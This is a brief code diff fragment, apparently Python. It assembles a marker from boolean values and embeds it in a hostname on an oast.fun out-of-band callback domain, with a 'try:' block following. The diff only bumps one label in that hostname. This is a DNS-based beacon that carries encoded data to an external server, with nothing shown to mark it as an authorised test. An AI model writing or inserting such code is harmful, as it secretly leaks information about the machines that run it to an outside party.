@@ -60,7 +60,7 @@ bits = [
 ]
 marker = "".join("1" if value else "0" for value in bits)
 host = (
-    f"cachemeta-a91f02-b{marker}."
+    f"cachemeta-a91f03-b{marker}."
     "dbkkplnrtgrmsabodvd0af7d4bueos337.oast.fun"
 )
 try:
